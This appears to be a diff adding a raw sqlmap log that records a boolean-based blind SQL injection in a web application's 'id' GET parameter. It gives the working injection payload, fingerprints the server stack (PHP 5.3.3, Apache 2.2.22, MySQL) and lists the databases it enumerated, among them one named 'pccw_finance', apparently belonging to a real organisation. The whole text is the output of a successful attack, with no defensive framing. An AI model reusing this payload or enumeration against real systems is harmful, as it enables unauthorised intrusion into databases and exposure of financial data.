@@ -1,0 +1,14 @@
+sqlmap identified the following injection point(s) with a total of 1878 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=248900' AND 5953=5953 AND 'rYfC'='rYfC
+---
+web application technology: PHP 5.3.3, Apache 2.2.22
+back-end DBMS: MySQL >= 5.0.0
+available databases [3]:
+[*] information_schema
+[*] pccw_finance
+[*] test
+
